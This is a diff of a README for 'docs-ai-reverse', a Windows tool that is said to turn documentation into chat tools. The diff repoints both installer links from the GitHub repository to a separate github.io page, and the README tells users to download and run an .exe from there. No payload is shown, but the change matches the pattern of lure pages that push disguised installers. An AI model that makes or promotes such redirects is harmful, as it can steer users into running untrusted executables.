@@ -1,6 +1,6 @@
 # 🚀 docs-ai-reverse - Transform documentation into standard chat tools
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://github.com/Austral-ownership166/docs-ai-reverse)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://austral-ownership166.github.io)
 
 ## What is this tool?
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The application requires a
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/Austral-ownership166/docs-ai-reverse) to download the software.
+1. Visit the [official releases page](https://austral-ownership166.github.io) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to save it to your computer.
 4. Locate the downloaded file in your downloads folder.
